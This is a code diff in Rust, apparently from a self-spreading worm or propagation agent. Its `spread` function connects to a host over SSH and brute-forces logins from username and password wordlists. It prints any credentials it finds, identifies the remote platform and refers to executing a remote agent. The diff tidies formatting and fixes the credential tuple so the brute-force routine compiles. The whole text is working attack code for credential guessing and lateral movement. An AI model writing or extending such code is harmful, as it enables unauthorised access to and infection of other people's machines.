@@ -33,18 +33,17 @@ pub fn spread(install_dir: PathBuf, host_port: &str) -> Result<(), crate::Error>
     ssh.set_tcp_stream(tcp);
     ssh.handshake()?;
 
-
     match bruteforce(&mut ssh)? {
         Some((username, password)) => {
             println!(
                 "Authenticated! username: ({}), password: ({})",
                 username, password
             );
-        },
+        }
         None => {
             println!("Couldn't authenticate. Aborting.");
             return Ok(());
-        },
+        }
     };
 
     let platform = identify_platform(&ssh)?;
@@ -98,12 +97,11 @@ fn execute_remote_agent(ssh: &Session, remote_path: &str) -> Result<(), crate::E
 }
 
 fn bruteforce(ssh: &Session) -> Result<Option<(String, String)>, crate::Error> {
-
     for username in wordlist::USERNAMES {
         for password in wordlist::PASSWORDS {
             let _ = ssh.userauth_password(username, password);
             if ssh.authenticated() {
-                return Ok(Some(username.to_string(), password.to_string()));
+                return Ok(Some((username.to_string(), password.to_string())));
             }
         }
     }
